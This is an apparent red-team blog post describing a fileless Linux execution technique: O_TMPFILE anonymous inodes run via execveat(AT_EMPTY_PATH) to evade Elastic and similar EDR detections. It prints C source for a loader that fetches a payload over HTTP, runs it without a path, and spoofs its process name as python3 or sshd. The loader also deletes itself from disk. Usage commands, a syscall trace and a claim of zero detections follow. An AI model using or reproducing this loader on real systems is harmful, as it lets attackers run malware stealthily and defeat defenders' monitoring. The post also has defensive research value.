---
title: "Fileless ELF Execution via O_TMPFILE"
date: 2026-09-06T00:00:00-04:00
description: "O_TMPFILE creates anonymous inodes on real filesystems with no directory entry. Combine it with execveat(AT_EMPTY_PATH) and you get fileless ELF execution that looks nothing like memfd_create in telemetry."
categories: [Evasion]
tags: [Fileless, EDR, Elastic, Linux, Red Team, Kernel]
author: 0xMatheuZ
draft: false
ShowToc: true
TocOpen: true
UseHugoToc: true
images:
  - "https://i.imgur.com/n4kkDlE.jpeg"
---

![imgur](https://i.imgur.com/n4kkDlE.jpeg)

`O_TMPFILE` + `execveat(AT_EMPTY_PATH)` is a way to execute an ELF binary that never touches disk as a named file. The running process shows up as `/tmp/#N (deleted)` in telemetry. No directory entry is ever created, no path ever exists, and the technique works on any kernel since 3.19.

Elastic Security Labs published [FENIX](https://github.com/elastic/fenix) alongside their [fileless execution research](https://www.elastic.co/security-labs/threat-command/memfd-create-linux-fileless-execution), covering 15 techniques across every major backing store. It's the most complete public coverage matrix for this category. This combination isn't in it.

---

## O_TMPFILE

`O_TMPFILE` is an `open()` flag introduced in Linux 3.11. Instead of passing a filename, you pass a directory. The kernel allocates an inode directly on that filesystem's superblock and returns a file descriptor. No directory entry is ever created. The file is invisible to `ls`, `find`, `inotify`, and `fanotify` from the moment it exists.

```c
int fd = open("/tmp", O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);
```

This is plain `open()`, syscall 2. The inode lands on the real `/tmp` filesystem with a real device number, not on the kernel's internal anonymous tmpfs. The resulting artifact in telemetry looks nothing like `memfd_create`.

The key is the inode/dentry split. An inode is the kernel's internal representation of a file: data, permissions, timestamps, block addresses. A dentry is the name-to-inode mapping that makes a path like `/tmp/payload` resolvable. `O_TMPFILE` creates the inode but skips `d_alloc()` entirely; no dentry is ever allocated. `inotify` and `fanotify` both hook into dentry operations. Without a dentry, neither system sees the file. No `IN_CREATE` event, no `FAN_CREATE` notification, nothing.

Write the payload bytes into the fd:

```c
write(fd, elf_bytes, elf_size);
```

The inode is real and the bytes are real. `O_TMPFILE` is not a memory trick. `linkat(2)` with `AT_EMPTY_PATH` can materialize the anonymous inode into a named path at any point, as long as you hold the fd. The inode gets a dentry and becomes visible. It starts nameless, and nameless is all that matters.

The "fileless" label is not absolute here. What it means is that the executed binary never has a directory entry, so it never has a path. Tools that track files by name, hash on-disk artifacts, or watch for file creation events see nothing, because a directory entry never existed.

---

## execveat(AT_EMPTY_PATH)

The kernel refuses to exec a fd that is open for writing; it returns `ETXTBSY`. The fix is to reopen the inode read-only through `/proc/self/fd/` and close the original:

```c
char fdpath[64];
snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
int ro_fd = open(fdpath, O_RDONLY | O_CLOEXEC);
close(fd);
```

Then execute with `execveat` and `AT_EMPTY_PATH`:

```c
execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
```

When `execveat` receives `AT_EMPTY_PATH` with an empty path string, it calls `do_execveat_common()` skipping path resolution entirely. The VFS never walks a directory tree, never constructs a pathname, never touches a dentry. It takes the backing file from the fd and loads the ELF directly. No path string is constructed anywhere: not in the syscall arguments, not in exec telemetry, not in process ancestry.

What the kernel records for the running process:

```
process.executable: /tmp/#220 (deleted)
```

The `#` prefix and inode number are how the kernel represents a nameless inode in `/proc`. The inode exists but has no directory entry, so the kernel uses `#<ino>` as its identifier. The `(deleted)` suffix appears for the same reason. Same suffix any process gets when it execs an already-unlinked file.

---

## The Loader

I built a loader handling three input modes: stdin pipe, HTTP fetch, and local file. The exec path:

```c
static void exec_anon(int anon_fd, char *const argv[], char *const envp[],
                      const char *spoof_name)
{
    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", anon_fd);
    int ro_fd = sc_open(fdpath, O_RDONLY | O_CLOEXEC, 0);
    sc_close(anon_fd);

    if (spoof_name)
        prctl(PR_SET_NAME, spoof_name, 0, 0, 0);

    char self_path[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (n > 0) sc_unlink(self_path);

    sc_execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
}
```

`prctl(PR_SET_NAME)` renames the thread before `execveat` replaces the process image. `unlink` on `/proc/self/exe` wipes the loader from disk before the payload takes over. Nothing remains on disk once execution passes to the payload.

Shared memory paths are not in the candidates list:

```c
static const char *anon_dirs[] = {
    "/tmp", "/var/tmp", "/run", NULL
};
```

Usage:

```bash
cat payload.elf | ./dntry stdin python3

./dntry http http://192.168.1.10:8080/payload python3

./dntry file ./payload python3
```

The third argument becomes `argv[0]` of the exec'd process:

```
process.name:       python3
process.executable: /tmp/#220 (deleted)
```

---

## Syscall Trace

Running the loader under strace shows the syscall chain:

- `open("/tmp", O_RDWR|O_CLOEXEC|O_TMPFILE, 0700)` — anonymous inode created, syscall 2
- `read(0, ...)` / `write(3, ...)` — payload written to the anon fd
- `open("/proc/self/fd/3", O_RDONLY|O_CLOEXEC)` — reopen to clear the write flag
- `prctl(PR_SET_NAME, "sshd")` — thread rename before exec
- `unlink("./dntry")` — loader removed from disk
- `execveat(4, "", ["sshd"], ..., AT_EMPTY_PATH)` — fd executed directly, no path

![strace output part 1](/img/fileless-strace1.png)
![strace output part 2](/img/fileless-strace2.png)

After `execveat` replaces the process image, the kernel sets the process comm from the executable's inode name: `#1835068`, not `sshd`. The `prctl` before exec only covers the window between the call and exec itself. `argv[0]` spoofing still works since that passes through exec args. For the comm field in the exec'd process to match, the payload itself needs to call `prctl(PR_SET_NAME)` at startup.

---

## Demo

![fileless payload running](/img/fileless-terminal.png)

![Elastic Security, 0 fileless detections](/img/fileless-elastic.png)

---

## Why This Works

Fileless detection is built around specific `memfd_create` artifacts: the `memfd:` prefix in `process.executable`, device `00:01`, syscall 319. `O_TMPFILE` produces none of them. It goes through the normal `open()` path on a real mounted filesystem. `execveat(AT_EMPTY_PATH)` hands the kernel an fd number directly, so no path string is ever constructed.

The only remaining signal is the `(deleted)` suffix in `process.executable`. That suffix is indistinguishable from any process that opens a file, unlinks it, and execs it later. Plenty of legitimate software does exactly that.

Detection signatures were written for `memfd_create` specifically, not for the underlying operation. `O_TMPFILE + execveat(AT_EMPTY_PATH)` expresses the same operation through a different path, and none of those signatures apply.

---

*Source: [github.com/MatheuZSecurity/Dntry](https://github.com/MatheuZSecurity/Dntry)*
